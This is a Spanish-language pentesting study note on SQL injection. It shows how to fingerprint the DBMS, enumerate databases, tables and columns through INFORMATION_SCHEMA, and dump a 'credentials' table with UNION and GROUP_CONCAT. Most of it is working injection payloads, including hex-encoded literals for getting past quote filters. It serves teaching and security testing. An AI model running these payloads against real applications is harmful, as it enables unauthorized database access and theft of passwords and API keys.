---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Enumeracion
Descripción: "Con una inyección UNION funcional y una columna visible, el objetivo es mapear y volcar el contenido del DBMS. El proceso es metódico: identificar el motor, listar bases de…"
Fecha de actualización: 2026-06-04
Nota previa: "[[05 - Inyección UNION]]"
Nota siguiente: "[[07 - Lectura de archivos]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

Con una [[05 - Inyección UNION|inyección UNION]] funcional y una columna visible, el objetivo es mapear y volcar el contenido del DBMS. El proceso es metódico: identificar el motor, listar bases de datos, sus tablas, sus columnas y, finalmente, extraer los datos. La llave maestra es la base de datos de metadatos `INFORMATION_SCHEMA`.

# Fingerprinting del DBMS

Cada motor tiene su sintaxis, así que primero hay que confirmar cuál es. Pistas del servidor web (Apache/Nginx → probablemente Linux → MySQL; IIS → probablemente MSSQL) son orientativas, no concluyentes. Lo fiable es probar consultas específicas:

| Payload | Cuándo usarlo | Salida en MySQL |
| ------- | ------------- | --------------- |
| `SELECT @@version` | Salida completa visible | Versión, p. ej. `10.3.22-MariaDB` |
| `SELECT POW(1,1)` | Solo salida numérica | `1` (error en otros motores) |
| `SELECT SLEEP(5)` | A ciegas / sin salida | Retarda 5 s y devuelve `0` |

Una salida como `10.3.22-MariaDB-1ubuntu1` confirma <mark style="background: #ADCCFFA6;">MariaDB, un fork de MySQL con sintaxis prácticamente idéntica</mark>.

# `INFORMATION_SCHEMA`: el mapa del DBMS

Para construir un `UNION SELECT` que extraiga datos concretos necesitamos saber qué bases, tablas y columnas existen. <mark style="background: #8000E1A6;">`INFORMATION_SCHEMA` es una base de datos del sistema que contiene los metadatos de todo el servidor</mark>. Al ser otra base de datos, sus tablas no se referencian directamente: se usa el operador punto (`.`):

```sql
SELECT * FROM otra_base.tabla;
```

# `SCHEMATA` → bases de datos

La tabla `SCHEMATA` lista todas las bases; su columna `SCHEMA_NAME` contiene los nombres:

```sql
cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

Además, `database()` revela la base en uso por la aplicación:

```sql
cn' UNION SELECT 1,database(),3,4-- -
```

> [!info]+
> Las bases `mysql`, `information_schema`, `performance_schema` y `sys` son **del sistema** y aparecen en toda instalación; se ignoran durante la enumeración. <mark style="background: #FF5582A6;">Lo interesante son las bases propias de la aplicación</mark> (en el ejemplo, `ilfreight` —la activa— y una `dev` que huele a entorno de desarrollo con datos sensibles).

# `TABLES` → tablas de una base

La tabla `TABLES` mapea cada tabla a su base mediante `TABLE_NAME` y `TABLE_SCHEMA`. Filtrando por la base objetivo:

```sql
cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
```

> [!warning]+
> El filtro `WHERE table_schema='dev'` es esencial: sin él se listan **todas** las tablas de **todas** las bases, ruido inmanejable. Pero introduce comillas anidadas que pueden romper el payload o ser filtradas. <mark style="background: #FFB86CA6;">La solución profesional es codificar el literal en hexadecimal</mark>: `WHERE table_schema=0x646576` equivale a `='dev'` sin usar ni una comilla —imprescindible cuando un filtro las bloquea—.

# `COLUMNS` → columnas de una tabla

Localizada una tabla jugosa (p. ej. `credentials`), la tabla `COLUMNS` da sus columnas vía `COLUMN_NAME`:

```sql
cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
```

# Volcado de datos

Con base, tabla y columnas conocidas, se vuelcan los datos colocándolos en las posiciones visibles y usando el operador punto:

```sql
cn' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
```

Esto devuelve hashes de contraseñas y claves API: el objetivo final.

> [!important]+
> Una limitación frecuente: la aplicación solo imprime **una fila** del resultado. <mark style="background: #FFB86CA6;">`GROUP_CONCAT()` resuelve esto concatenando todas las filas (y columnas) en un único valor</mark>, que sí cabe en la única posición visible:
> ```sql
> cn' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4 FROM dev.credentials-- -
> ```
> Aquí `0x3a` es `:` y `0x0a` es un salto de línea (de nuevo, hex para evitar comillas). Es la técnica estándar para exfiltrar una tabla entera de un solo disparo, y un patrón que [[SQLMap.base|SQLMap]] automatiza internamente.

> [!info]+
> Para ejecutar consultas arbitrarias —no solo `SELECT` de columnas— se puede envolver con `CAST(... AS NCHAR)`, p. ej. `CAST(current_user AS NCHAR)`, útil cuando se quiere el resultado de una función en una posición que espera texto.

Volcar datos es el caso común, pero según los privilegios de la cuenta del DBMS, una SQLi puede ir más allá y tocar el sistema de ficheros: [[07 - Lectura de archivos]].
